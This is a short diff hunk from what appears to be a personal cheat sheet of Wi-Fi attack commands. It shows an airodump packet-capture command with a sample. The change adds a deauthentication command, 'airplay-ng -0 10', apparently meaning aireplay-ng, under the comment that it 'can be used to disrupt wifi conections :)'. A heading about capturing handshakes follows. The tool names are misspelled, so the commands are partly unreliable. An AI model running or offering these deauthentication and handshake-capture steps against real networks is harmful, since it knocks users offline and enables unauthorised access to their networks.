@@ -68,7 +68,8 @@ airdump "adaptername in monitor mode or ex:wlan0mon" --bssid "mac address" --cha
 
 sample: airdump wlan0mon --bssid 20:c2:20:21:1a --channel 11 -w Desktop/filename
 
-
+ can be used to disrupt wifi conections :)
+airplay-ng -0 10 -a "router macaddress" "adapter name in monitor mode ex: wlan0mon"
 
 /////////////modify .cap or capture handshake
 
